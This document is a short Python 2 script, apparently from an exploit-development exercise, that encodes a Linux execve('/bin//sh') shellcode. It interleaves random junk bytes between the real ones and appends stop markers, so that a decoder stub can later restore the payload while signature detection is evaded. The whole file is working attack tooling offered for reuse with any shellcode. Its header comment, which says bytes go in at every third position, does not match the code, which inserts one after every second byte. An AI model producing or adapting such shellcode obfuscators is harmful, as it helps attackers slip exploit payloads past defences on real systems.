#!/usr/bin/python

# This script will insert 1 of 8 random characters of your choice, at every 3rd position in your shellcode

# Python Insertion Encoder 
import random

# put your shell code here
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

# enter your insertion characters here, these will be used randomly, do not use your stop char
inschars = [0xAA,0xAB,0xAC,0xCB,0xCA,0x1B,0x2A,0x3B]

# enter your stop chars here, they should be the same
stopchrs = "\\xBB,\\xBB"
stopchrs2 = "0xBB,0xBB"

encoded = ""
encoded2 = ""

print 'Encoded shellcode ...'

cnt = 0

for x in bytearray(shellcode) :
	encoded += '\\x'
	encoded += '%02x' % x
        encoded2 += '0x'
        encoded2 += '%02x,' %x

	#every other loop add a random insertion character
	if cnt == 1:
	    inschar=inschars[random.randint(0,7)]
  	    encoded += '\\x%02x' % inschar
	    encoded2 += '0x%02x,' % inschar
	    cnt = 0
	else:
	    cnt+=1

print encoded+stopchrs

print encoded2+stopchrs2

print 'Len: %d' % len(bytearray(shellcode))
